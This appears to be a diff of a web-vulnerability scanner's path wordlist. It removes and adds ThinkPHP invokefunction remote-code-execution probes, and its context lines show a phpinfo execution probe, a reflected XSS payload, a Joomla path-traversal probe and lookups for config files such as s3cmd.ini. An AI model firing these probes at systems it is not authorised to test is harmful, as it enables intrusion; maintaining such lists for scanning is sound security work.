@@ -752,20 +752,6 @@
 ?qm_display_admin_bar=1
 ?rest_route=/wp/v2/users
 ?rest_route=/wp/v2/users/
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=0odj3x8v
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=4jyqfh7x
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=6gobbbgc
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=8hxxvpo9
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=bozsfteb
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=fhle8i5o
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=obiyvkow
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=ovegtyld
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=oz1lukmx
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=qmenvzph
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=r0rb7ubn
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=uucf1z6w
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=vd6me498
-?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=xuh9ugc2
 ?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
 ?s=foo
 ?s={search_term_string}
@@ -4431,8 +4417,6 @@ index.php?m=api&c=app&a=getPlatformConfig
 index.php?m=member&f=login_save
 index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/
 index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
-index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
-index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
 index.php?s=/home/page/uploadImg
 index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
 index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))}
@@ -6866,6 +6850,7 @@ s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
 s/sfsites/aura
 s1.php
 s3cmd.ini
+s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=4jyqfh7x
 sYm.php
 s_api/basic/config_js?callback=__set_config
 s_api/basic/download/info
